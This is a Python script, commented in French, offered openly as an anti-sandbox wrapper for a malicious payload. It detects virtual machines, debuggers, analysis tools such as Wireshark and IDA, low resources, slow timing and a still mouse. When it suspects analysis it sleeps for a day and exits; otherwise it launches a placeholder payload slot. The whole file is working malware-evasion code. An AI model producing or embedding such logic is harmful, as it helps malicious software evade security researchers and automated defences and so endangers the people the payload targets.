# Payload anti-sandbox — VM/debugger/timing/souris/RAM detection
import os, sys, time, ctypes, subprocess

def check_vm_registry() -> bool:
    if sys.platform != "win32": return False
    try:
        import winreg
        for k in [r"SOFTWARE\VMware, Inc.\VMware Tools",
                   r"SOFTWARE\Oracle\VirtualBox Guest Additions",
                   r"SYSTEM\CurrentControlSet\Services\VBoxGuest"]:
            try: winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, k); return True
            except FileNotFoundError: pass
    except Exception: pass
    return False

def check_vm_processes() -> bool:
    procs = {"vmtoolsd.exe","vboxservice.exe","wireshark.exe",
             "procmon.exe","ollydbg.exe","x64dbg.exe","ida64.exe"}
    try:
        out = subprocess.run(
            "tasklist" if sys.platform=="win32" else "ps aux",
            capture_output=True, text=True, timeout=5
        ).stdout.lower()
        return any(p in out for p in procs)
    except Exception: return False

def check_timing() -> bool:
    start = time.perf_counter()
    for _ in range(1_000_000): pass
    return time.perf_counter() - start > 2.0

def check_low_resources() -> bool:
    if (os.cpu_count() or 1) < 2: return True
    if sys.platform == "win32":
        try:
            m = ctypes.c_ulonglong(0)
            ctypes.windll.kernel32.GetPhysicallyInstalledSystemMemory(ctypes.byref(m))
            if m.value < 2*1024*1024: return True
        except Exception: pass
    return False

def check_no_mouse() -> bool:
    if sys.platform != "win32": return False
    try:
        class PT(ctypes.Structure):
            _fields_ = [("x",ctypes.c_long),("y",ctypes.c_long)]
        p1,p2 = PT(),PT()
        ctypes.windll.user32.GetCursorPos(ctypes.byref(p1))
        time.sleep(3)
        ctypes.windll.user32.GetCursorPos(ctypes.byref(p2))
        return p1.x==p2.x and p1.y==p2.y
    except Exception: return False

def is_sandbox() -> bool:
    return sum([check_vm_registry(), check_vm_processes(),
                check_timing(), check_low_resources(), check_no_mouse()]) >= 2

def real_payload():
    print("[+] environnement réel — payload lancé")
    # FILL: ton payload ici

if is_sandbox():
    time.sleep(86400); sys.exit(0)
else:
    real_payload()
    